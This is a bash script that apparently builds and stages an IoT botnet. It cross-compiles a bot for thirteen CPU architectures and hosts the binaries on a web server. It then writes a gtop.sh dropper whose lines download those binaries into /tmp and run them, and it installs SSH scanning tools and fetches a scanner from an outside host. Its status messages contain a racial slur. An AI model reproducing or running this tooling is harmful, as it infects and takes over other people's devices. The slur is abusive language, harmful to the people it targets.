#!/bin/bash
clear
echo -e '\x1b[1;35m'
echo "###############################################################################"
echo "# ___     __________  ____ _______      _____ _______________.___.  ___       #"
echo "# / _ \_/\ \______   \/_   |\      \    /  _  \\______   \__  |   | / _ \_/\  #"
echo "# \/ \___/  |    |  _/ |   |/   |   \  /  /_\  \|       _//   |   | \/ \___/  #"
echo "#           |    |   \ |   /    |    \/    |    \    |   \\____   |           #"
echo "#           |______  / |___\____|__  /\____|__  /____|_  // ______|           #"
echo "#                  \/              \/         \/       \/ \/                  #"
echo "###############################################################################"
echo -e '\x1b[0m'
if [ $# != 1 ]; then
echo "Usage: $0 [BOT]"
exit 0
fi
#########################################
###############wBotnames##################
#########################################
L1='jackmyarmv41'  #armv4l
L2='jackmyarmv51'  #armv5l
L3='jackmyarmv61'  #armv6l
L4='jackmyi586'  #i586
L5='jackmyi686'  #i686
L6='jackmym68k'  #m68k
L7='jackmymipsel'  #mipsel
L8='jackmymips'  #mips
L9='jackmypowerpc-440fp'  #powerpc-440fp
L10='jackmypowerpc' #powerpc
L11='jackmysh4' #sh4
L12='jackmyx86_64' #x86_64
L13='jackmysparc' #sparc
#########################################
##############Wgetlinks##################
#########################################
armv4l='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2'
armv5l='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2'           
armv6l='http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2'
i586='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2'
i686='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2'              
m68k='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2'               
mipsel='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2'            
mips='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2'              
powerpc440fp='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc-440fp.tar.bz2'     
powerpc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2'
sh4='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2'               
x86_64='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2'        
sparc='http://uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2'   
#########################################
################MISC#####################
#########################################

#########################################
##################WGETS##################
#########################################
echo -e "Wgetting cross-compilers be paitent you jagged rocky mountain teeth ass\e[0m"
if [ -d cross-compiler-armv4l ]
then
echo -e "\e[1;32mcross-compiler-armv4l is present, no need for wget\e[0m"
else
wget --quiet $armv4l
tar -xvjf cross-compiler-armv4l*
fi
if [ -d cross-compiler-armv5l ]
then
echo -e "\e[1;32mcross-compiler-armv5l is present, no need for wget\e[0m"
else
wget --quiet $armv5l
tar -xvjf cross-compiler-armv5l*
fi
if [ -d cross-compiler-armv6l ]
then
echo -e "\e[1;32mcross-compiler-armv6l is present, no need for wget\e[0m"
else
wget --quiet $armv6l
tar -xvjf cross-compiler-armv6l*
fi
if [ -d cross-compiler-i586 ]
then
echo -e "\e[1;32mcross-compiler-i586 is present, no need for wget\e[0m"
else
wget --quiet $i586
tar -xvjf cross-compiler-i586*
fi
if [ -d cross-compiler-i686 ]
then
echo -e "\e[1;32mcross-compiler-i686 is present, no need for wget"
else
wget --quiet $i686
tar -xvjf cross-compiler-i686*
fi
if [ -d cross-compiler-m68k ]
then
echo -e "\e[1;32mcross-compiler-m68k is present, no need for wget\e[0m"
else
wget --quiet $m68k
tar -xvjf cross-compiler-m68k*
fi
if [ -d cross-compiler-mipsel ]
then
echo -e "\e[1;32mcross-compiler-mipsel is present, no need for wget\e[0m"
else
wget --quiet $mipsel
tar -xvjf cross-compiler-mipsel*
fi
if [ -d cross-compiler-mips ]
then
echo -e "\e[1;32mcross-compiler-mips is present, no need for wget\e[0m"
else
wget --quiet $mips
tar -xvjf cross-compiler-mips*
fi
if [ -d cross-compiler-powerpc-440fp ]
then
echo -e "\e[1;32mcross-compiler-powerpc-440fp is present, no need for wget\e[0m"
else
wget --quiet $powerpc440fp
tar -xvjf cross-compiler-powerpc-440fp*
fi
if [ -d cross-compiler-powerpc ]
then
echo -e "\e[1;32mcross-compiler-powerpc is present, no need for wget\e[0m"
else
wget --quiet $powerpc
tar -xvjf cross-compiler-powerpc*
fi
if [ -d cross-compiler-sh4 ]
then
echo -e "\e[1;32mcross-compiler-sh4 is present, no need for wget\e[0m"
else
wget --quiet $sh4
tar -xvjf cross-compiler-sh4*
fi
if [ -d cross-compiler-x86_64 ]
then
echo -e "\e[1;32mcross-compiler-x86_64 is present, no need for wget\e[0m"
else
wget --quiet $x86_64
tar -xvjf cross-compiler-x86_64*
fi
if [ -d cross-compiler-sparc ]
then
echo -e "\e[1;32mcross-compiler-sparc is present, no need for wget\e[0m"
else
wget --quiet $sparc
tar -xvjf cross-compiler-sparc*
fi
rm -rf *.tar.bz2
echo -e "\e[1;35mDone, You Lazy fucking nigger.\e[0m"
sleep 3
#########################################
##############Compiling##################
#########################################
./cross-compiler-armv4l/bin/armv4l-gcc -static -lpthread -pthread -D armv4l -o $L1 $1 > /dev/null 2>&1
./cross-compiler-armv5l/bin/armv5l-gcc -static -lpthread -pthread -D armv5l -o $L2 $1 > /dev/null 2>&1
./cross-compiler-armv6l/bin/armv6l-gcc -static -lpthread -pthread -D armv6l -o $L3 $1 > /dev/null 2>&1
./cross-compiler-i586/bin/i586-gcc -static -lpthread -pthread -D i586 -o $L4 $1 > /dev/null 2>&1
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -D i686 -o $L5 $1 > /dev/null 2>&1
./cross-compiler-m68k/bin/m68k-gcc -static -lpthread -pthread -D m68k -o $L6 $1 > /dev/null 2>&1
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -D mipsel -o $L7 $1 > /dev/null 2>&1
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -D mips -o $L8 $1 > /dev/null 2>&1
./cross-compiler-powerpc-440fp/bin/powerpc-440fp-gcc -static -lpthread -pthread -D powerpc-440fp -o $L9 $1 > /dev/null 2>&1
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -D powerpc -o $L10 $1 > /dev/null 2>&1
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -D sh4 -o $L11 $1 > /dev/null 2>&1 > /dev/null 2>&1
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -D x86_64 -o $L12 $1 > /dev/null 2>&1
./cross-compiler-sparc/bin/sparc-gcc -o $L13 $1 > /dev/null 2>&1\              
echo -e "\e[1;35mDone compiling binarys, stripped and bytes reduced.\e[0m"
mv jackmy* /var/www/html/
#########################################
#########Setting up gtop.sh##############
#########################################
echo -e "\e[1;35mTouching gtop.sh"
rm -rf gtop.sh
cd /var/www/html/; touch gtop.sh
echo -e "\e[1;35m Creating Payload now."
echo -e "\e[1;35mThis will take a few, be patient.."
sleep 2
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L1 && chmod +x $L1 && ./$L1">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L2 && chmod +x $L2 && ./$L2">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L3 && chmod +x $L3 && ./$L3">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L4 && chmod +x $L4 && ./$L4">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L5 && chmod +x $L5 && ./$L5">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L6 && chmod +x $L6 && ./$L6">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L7 && chmod +x $L7 && ./$L7">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L8 && chmod +x $L8 && ./$L8">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L9 && chmod +x $L9 && ./$L9">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L10 && chmod +x $L10 && ./$L10">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L11 && chmod +x $L11 && ./$L11">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L12 && chmod +x $L12 && ./$L12">> gtop.sh
echo "cd /tmp && wget -q http://$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//')/$L13 && chmod +x $L13 && ./$L13">> gtop.sh
#########################################
###############ULIMIT####################
#########################################
cd /root
ulimit -u 999999;ulimit -n 999999
echo "#.bashrc">> .bashrc
echo "#ulimit set">> .bashrc
echo "ulimit -u 999999">> .bashrc
echo "ulimit -n 999999">> .bashrc
bash
#########################################
###############WGETS#####################
#########################################
$wgetLRAB='http://b.1339.cf/pbehfwe.zip'
$wgetscan='http://b.1339.cf/xhuudjm.py'

#########################################
######Installing mods for scanning#######
#########################################
echo -e "\e[0;31mInstalling Dependencies For Scanning"
sleep 3
echo -e "\e[0;31mFinishing up install...."
yum install cpan wget curl glibc.i686 -y
cpan force install Parallel::ForkManager
cpan force install IO::Socket
cpan force install IO::Select
sleep 2
yum install gcc php-devel php-pear libssh2 libssh2-devel
pecl install -f ssh2
touch /etc/php.d/ssh2.ini
echo extension=ssh2.so > /etc/php.d/ssh2.ini
cpan force install Net::SSH2
yum install python-paramiko

#########################################
################LRAB#####################
#########################################
echo -e "\e[0;31mScanner can be found in /root/scan"
sleep 2
mkdir /root/scan/
cd /root/scan/
wget --quiet $wgetLRAB -O LRAB.zip; unzip LRAB.zip; wget --quiet $wgetscan -O scan.py;
echo "I Got To Give Some Thanks To ShAy sense it was based off of NSA.sh"
echo "Done, Now Finish Your Self Replicating Flame Botnet"